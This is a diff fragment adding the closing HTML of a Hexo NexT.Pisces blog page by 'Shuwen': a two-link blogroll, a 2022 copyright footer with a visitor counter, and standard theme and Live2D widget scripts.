+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://kaaass.net/" title="https:&#x2F;&#x2F;kaaass.net&#x2F;" rel="noopener" target="_blank">KAAAsS</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xuanxuanblingbling.github.io/" title="https:&#x2F;&#x2F;xuanxuanblingbling.github.io&#x2F;" rel="noopener" target="_blank">Clang裁缝店</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shuwen</span>
+</div>
+	<div class="powered-by">
+		<i class="fa fa-user-md"></i>
+		<span id="busuanzi_container_site_uv">
+		  本站访客数:<span id="busuanzi_value_site_uv"></span>
+		</span>
+	</div>
+
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
